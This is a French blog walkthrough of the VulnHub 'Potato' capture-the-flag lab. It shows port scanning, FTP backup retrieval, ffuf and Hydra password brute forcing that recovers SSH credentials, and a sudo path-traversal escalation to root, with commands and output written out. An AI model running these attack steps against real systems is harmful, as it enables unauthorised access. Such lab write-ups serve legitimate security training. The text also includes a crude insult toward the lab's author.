# Solution du CTF Potato de VulnHub

[Potato](https://vulnhub.com/entry/potato-1,529/) est un CTF proposé sur VulnHub. Il est nul. Fuyez pauvres fous !

```shellsession
$ sudo nmap -p- -T5 -sCV 192.168.56.63
[sudo] Mot de passe de root : 
Starting Nmap 7.93 ( https://nmap.org )
Nmap scan report for 192.168.56.63
Host is up (0.00011s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ef240eabd2b316b44b2e27c05f48798b (RSA)
|   256 f2d8353f4959858507e6a20e657a8c4b (ECDSA)
|_  256 0b2389c3c026d5645e93b7baf5147f3e (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Potato company
|_http-server-header: Apache/2.4.41 (Ubuntu)
2112/tcp open  ftp     ProFTPD
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--   1 ftp      ftp           901 Aug  2  2020 index.php.bak
|_-rw-r--r--   1 ftp      ftp            54 Aug  2  2020 welcome.msg
```

Je m'empresse de télécharger de fichier `bak` que Nmap a détecté :

```php
<html>
<head></head>
<body>

<?php

$pass= "potato"; //note Change this password regularly

if($_GET['login']==="1"){
  if (strcmp($_POST['username'], "admin") == 0  && strcmp($_POST['password'], $pass) == 0) {
    echo "Welcome! </br> Go to the <a href=\"dashboard.php\">dashboard</a>";
    setcookie('pass', $pass, time() + 365*24*3600);
  }else{
    echo "<p>Bad login/password! </br> Return to the <a href=\"index.php\">login page</a> <p>";
  }
  exit();
}
?>


  <form action="index.php?login=1" method="POST">
                <h1>Login</h1>
                <label><b>User:</b></label>
                <input type="text" name="username" required>
                </br>
                <label><b>Password:</b></label>
                <input type="password" name="password" required>
                </br>
                <input type="submit" id='submit' value='Login' >
  </form>
</body>
</html>
```

Le fichier à la racine du site ne semble pas correspondre mais une petite énumération met en lumière la présence du dossier `/admin` dont l'index correspond au script.

Il y a aussi un dossier `/potato` mais ce dernier est vide.

Je suis tenté de prendre le backup au pied de la lettre mais les identifiants sur le formulaire de login sont rejetés.

Définir le cookie comme indiqué dans le code ne fonctionne pas non plus :

```shellsession
$ curl -D- -H "Cookie: pass=potato;" http://192.168.56.63/admin/dashboard.php -e "http://192.168.56.63/admin/index.php?login=1"
HTTP/1.1 302 Found
Date: Fri, 18 Nov 2022 16:03:46 GMT
Server: Apache/2.4.41 (Ubuntu)
Location: index.php
Content-Length: 0
Content-Type: text/html; charset=UTF-8
```

On est redirigé vers la page d'accueil :(

Une énumération web avec les wordlists *raft* de *fuzzdb* ne retournent rien mis à part le dossier /admin/logs.

Ce dernier contient trois fichiers texte avec les contenus suivant :

```
Operation: password change
Date: January 03, 2020 / 11:25 a.m.
User: admin
Status: OK


Operation: reboot the server
Date: January 09, 2020 / 9:55 a.m.
User: admin
Status: OK 


Operation: password change
Date: August 2, 2020 / 9:25 p.m.
User: admin
Status: OK
```

Le dernier fichier est plus gros car il contient pas mal de writespaces inutiles en fin de lignes.

Comme le script PHP indique de changer le mot de passe régulièrement je tente de me mettre dans la tête d'un utilisateur lambda et teste des mots de passe tel que `potato1`, `summer2020`, etc, sans succès.

J'ai procédé à une attaque brute force à l'aide de ffuf :

```shellsession
$ ffuf -u "http://192.168.56.63/admin/index.php?login=1" -w wordlists/rockyou.txt -X POST -d "username=admin&password=FUZZ" -H "Content-type: application/x-www-form-urlencoded" -fs 109
```

J'ai laissé tomber après une bonne demi heure de scan.

On est dans un cas typique où l'auteur du CTF a mis en place une solution qui lui semblait clair pour lui... mais pour lui seul.

Du coup après recherche sur le web il s'avère que non seulement le mot de passe attendu ne concerne pas le script web mais plutôt SSH, l'utilisateur n'est pas `admin` et le mot de passe n'est pas une variante de `potato` !

Du coup il fallait faire cela :

```shellsession
$ ./hydra -l webadmin -P rockyou.txt ssh://192.168.56.63
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344381 login tries (l:1/p:14344381), ~896524 tries per task
[DATA] attacking ssh://192.168.56.63:22/
[22][ssh] host: 192.168.56.63   login: webadmin   password: dragon
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished
```

Wow ! Les parents de l'auteur de ce CTF auraient du le noyer à sa naissance !

Une fois qu'on a obtenu notre shell on peut aller voir ce fameux script `dashboard.php` et il contient des vulnérabilités qu'il aurait pu être intéressant d'exploiter mais tout est bloqué par ces premières lignes :

```php
<?php

if($_COOKIE['pass']!=="serdesfsefhijosefjtfgyuhjiosefdfthgyjh"){
  header('Location: index.php');
  exit();
}
?>
```

Je pouvais faire tourner rockyou longtemps dessus ! A croire que l'auteur a volontairement saboté son travail.

La suite du CTF a sans doute plus de logique mais n'a absolutment rien d'intéressant :

```shellsession
webadmin@serv:/var/www/html/admin$ sudo -l
[sudo] password for webadmin: 
Matching Defaults entries for webadmin on serv:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User webadmin may run the following commands on serv:
    (ALL : ALL) /bin/nice /notes/*
webadmin@serv:/notes$ sudo /bin/nice /notes/../bin/dash
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# cat root.txt
bGljb3JuZSB1bmlqYW1iaXN0ZSBxdWkgZnVpdCBhdSBib3V0IGTigJl1biBkb3VibGUgYXJjLWVuLWNpZWwuIA==
# echo bGljb3JuZSB1bmlqYW1iaXN0ZSBxdWkgZnVpdCBhdSBib3V0IGTigJl1biBkb3VibGUgYXJjLWVuLWNpZWwuIA== | base64 -d
licorne unijambiste qui fuit au bout d’un double arc-en-ciel.
```

Heureusement pour tous les fans de CTF l'auteur ne semble pas avoir réitéré depuis :D

*Publié le 18 novembre 2022*
